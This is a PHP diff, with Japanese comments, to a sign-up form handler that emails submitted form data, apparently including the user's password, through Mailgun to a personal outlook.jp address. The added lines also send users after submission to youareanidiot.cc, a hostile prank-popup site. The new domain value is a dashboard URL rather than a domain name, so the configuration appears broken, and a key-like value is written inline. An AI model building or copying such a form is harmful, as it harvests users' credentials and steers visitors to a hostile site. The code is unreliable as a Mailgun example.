@@ -9,7 +9,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = htmlspecialchars($_POST['password']);
 
     $mgClient = Mailgun::create('1b5736a5-b641be0b'); // MailgunのAPIキー
-    $domain = "yourdomain.com"; // Mailgunで設定したドメインを指定
+    $domain = "https://app.mailgun.com/app/sending/domains/sandbox2a8a2607eba4407a8e4dc1872e5542d5.mailgun.org"; // Mailgunで設定したドメインを指定
 
     $to = 'samuson846@outlook.jp';
     $subject = '新しいアカウント登録';
@@ -17,13 +17,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     try {
         $mgClient->messages()->send($domain, [
-            'from'    => 'noreply@yourdomain.com', // 送信元のメールアドレス
+            'from'    => 'samuson846@outlook.jp', // 送信元のメールアドレス
             'to'      => $to,
             'subject' => $subject,
             'text'    => $message
         ]);
 
-        header('Location: https://example.com/thank-you'); // リダイレクト先URLを指定
+        header('Location: https://youareanidiot.cc/'); // リダイレクト先URLを指定
         exit();
     } catch (Exception $e) {
         echo 'メール送信に失敗しました: ' . $e->getMessage();
